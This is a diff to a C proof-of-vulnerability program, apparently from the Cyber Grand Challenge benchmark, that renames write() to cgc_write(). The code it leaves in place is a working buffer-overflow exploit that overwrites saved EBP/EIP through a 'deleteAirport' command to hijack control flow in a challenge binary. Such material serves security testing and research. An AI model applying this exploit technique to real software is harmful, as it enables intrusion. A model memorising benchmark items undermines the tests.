@@ -28,7 +28,7 @@ THE SOFTWARE.
 #include <libcgc.h>
 
 
-int write( int fd, void *buffer, size_t count )
+int cgc_write( int fd, void *buffer, size_t count )
 {
 	size_t written;
     int total_written;
@@ -103,16 +103,16 @@ int value;
 	regnum = 5;
 
 
-	if (write(3, &pov_type, sizeof(pov_type)) == -1)
+	if (cgc_write(3, &pov_type, sizeof(pov_type)) == -1)
 		_terminate(-1);
 
-	if (write(3, &ip_mask, sizeof(ip_mask)) == -1)
+	if (cgc_write(3, &ip_mask, sizeof(ip_mask)) == -1)
 		_terminate(-1);
 
-	if (write(3, &regmask, sizeof(regmask)) == -1)
+	if (cgc_write(3, &regmask, sizeof(regmask)) == -1)
 		_terminate(-1);
 
-	if (write(3, &regnum, sizeof(regnum)) == -1)
+	if (cgc_write(3, &regnum, sizeof(regnum)) == -1)
 		_terminate(-1);
 
 	if (receive_bytes(3, &ipvalue, sizeof(ipvalue)) == -1)
@@ -137,7 +137,7 @@ int value;
 	newEIP[3] = (ipvalue >> 24) & 0xff;
 
 	// perform the overwrite in the deleteAirport command
-	write(1, "3/AAAAAAAA", 10);
+	cgc_write(1, "3/AAAAAAAA", 10);
 
 
 	buffer[0] = 0x7c;
@@ -145,16 +145,16 @@ int value;
 	buffer[2] = 0x06;
 	buffer[3] = 0x08;
 
-	write(1, buffer, 4);
-	write(1, buffer, 4);
+	cgc_write(1, buffer, 4);
+	cgc_write(1, buffer, 4);
 
-	write(1, newEBP, 4);
-	write(1, newEIP, 4);
+	cgc_write(1, newEBP, 4);
+	cgc_write(1, newEIP, 4);
 
-	write(1, "\n", 1);
+	cgc_write(1, "\n", 1);
 
-	// send an exit for the patched CB
-	write(1, "13\n", 3);
+	// send an cgc_exit for the patched CB
+	cgc_write(1, "13\n", 3);
 
 }
 
